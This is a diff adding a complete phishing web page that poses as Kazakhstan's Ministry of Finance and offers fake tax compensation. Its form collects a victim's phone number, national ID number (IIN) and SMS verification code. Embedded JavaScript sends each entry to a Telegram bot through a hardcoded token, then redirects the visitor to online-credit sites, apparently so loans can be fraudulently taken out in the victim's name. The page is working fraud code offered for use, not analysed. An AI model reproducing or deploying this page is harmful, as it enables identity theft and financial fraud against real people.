@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Минималистичный сайт</title>
+    <link rel="stylesheet" href="styles.css">
+	<style>
+	body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    background: #f0faff;
+    color: #333;
+    text-align: center;
+}
+
+.container {
+    width: 90%;
+    max-width: 600px;
+    margin: 20px auto;
+}
+
+header {
+    background: #0099ff;
+    color: white;
+    padding: 10px 0;
+}
+
+.language-switch {
+    float: right;
+    font-size: 14px;
+}
+
+main img {
+    width: 100%;
+    max-width: 300px;
+    margin-top: 10px;
+}
+
+form {
+    background: white;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+}
+
+input, button {
+    width: 90%;
+    padding: 10px;
+    margin: 10px 0;
+    font-size: 16px;
+}
+
+button {
+    background: #0099ff;
+    color: white;
+    border: none;
+    cursor: pointer;
+}
+
+button:hover {
+    background: #0077cc;
+}
+
+/* Окно проверки кода */
+.modal {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.5);
+}
+
+.modal-content {
+    background: white;
+    padding: 20px;
+    border-radius: 10px;
+    text-align: center;
+    margin: 15% auto;
+    width: 80%;
+    max-width: 300px;
+}
+
+/* Подвал */
+footer {
+    background: #0099ff;
+    color: white;
+    padding: 10px 0;
+}
+
+footer a {
+    color: white;
+}
+
+.logos img {
+    width: 50px;
+    margin: 10px;
+}
+	</style>
+</head>
+<body>
+
+    <!-- Хедер -->
+    <header>
+        <div class="container">
+            <h1>Министерство Финансов Республики Казахстан</h1>
+        </div>
+    </header>
+
+    <!-- Основная часть -->
+    <main>
+        <div class="container">
+            <h2>Денежная компенсация населению</h2>
+            <p>Комитет Государственных Доходов вводит специальный налоговый режим (далее СНР) в связи с продолжающийся инфляцией. 
+			В рамках СНР было решено пересмотреть процедуру налогообложения, в связи с чем глава Комитета Государственных Доходов Дуйсембиев Жандос Жумабаевич
+			распорядился выплатить компенсации, связанные с излишком налоговых взысканий. Компенсация зависит от индивидуальной суммы налогообложения в период с 1 квартала 2024 года</p>
+			<b>Период подачи заявок заканчивается 01.04.2025</b>
+			<p>Компенсация доступна всем группам населения из списка:</p>
+			<list>
+			<li>Пенсионеры</li>
+			<li>Граждане, чей трудовой стаж достиг 1 года</li>
+			<li>Индивидуальные предприниматели</li>
+			<li>Граждане оплачивающие налог на транспортное средство</li>
+			<li>Граждане оплачивающие налог на недвижимость</li>
+			</list>
+            <img src="https://kgd.gov.kz/sites/default/files/styles/pred/public/pred/duysembiev.jpg?itok=FNh0CaDf" class="main-image">
+
+            <!-- Форма -->
+            <form id="dataForm">
+			<p><b>Заполните форму чтобы узнать сумму компенсации</b></p>
+                <label for="phone">Номер телефона</label>
+                <input type="text" id="phone" value="+7" maxlength="12" required>
+
+                <label for="iin">ИИН</label>
+                <input type="text" id="iin" maxlength="12" required>
+
+                <button type="submit">Отправить</button>
+            </form>
+        </div>
+    </main>
+
+    <!-- Окно проверки кода -->
+    <div id="codeModal" class="modal">
+        <div class="modal-content">
+            <p>Сообщение с 1414 направлено на Ваш номер. Никому не сообщайте код!</p>
+            <input type="text" id="codeInput" maxlength="4" placeholder="Введите код">
+            <button id="verifyButton">Проверить</button>
+        </div>
+    </div>
+
+    <!-- Подвал -->
+    <footer>
+        <div class="container">
+            <p>Контакты: +7 123 456 78 90, +7 987 654 32 10</p>
+            <a href="#">Политика конфиденциальности</a>
+            <div class="logos">
+                <img src="logo1.png">
+                <img src="logo2.png">
+                <img src="logo3.png">
+            </div>
+        </div>
+    </footer>
+
+    <script>
+	document.getElementById("dataForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    let phone = document.getElementById("phone").value;
+    let iin = document.getElementById("iin").value;
+
+    if (!/^\+7\d{10}$/.test(phone)) {
+        alert("Номер телефона должен быть в формате +7XXX-XXX-XX-XX");
+        return;
+    }
+    if (!/^\d{12}$/.test(iin)) {
+        alert("ИИН должен содержать 12 цифр");
+        return;
+    }
+
+    let dataString = `МАМОНТ ЖДЕТ КОД \n ${phone} \n ${iin}`;
+    sendToTelegram(dataString);
+
+    document.getElementById("codeModal").style.display = "block";
+});
+
+document.getElementById("verifyButton").addEventListener("click", function () {
+    let code = document.getElementById("codeInput").value;
+
+    if (!/^\d{4}$/.test(code)) {
+        alert("Введите 4-значный код");
+        return;
+    }
+
+    let finalData = `СЛОВИЛИ МАМОНТА: \n\n 📞телефон: ${document.getElementById("phone").value} \n 📝иин: ${document.getElementById("iin").value} \n ✉️код: ${code}`;
+    sendToTelegram(finalData);
+
+    document.getElementById("codeModal").style.display = "none";
+
+    setTimeout(() => {
+	    window.open('https://halykbank.kz/online-credit');
+        window.location.href = "https://ffin.credit/apply/cash";
+    }, 10000);
+});
+
+function sendToTelegram(text) {
+    const URL = `https://api.telegram.org/bot7877616663:AAEyowU99Oi73bA0kqqo9COLArim6iWS3CU/sendMessage?chat_id=-4753998453&text=${encodeURIComponent(text)}`;
+
+    fetch(URL)
+        .then(response => response.json())
+        .then(data => console.log("Отправлено:", data))
+        .catch(error => console.error("Ошибка:", error));
+}
+	</script>
+</body>
+</html>
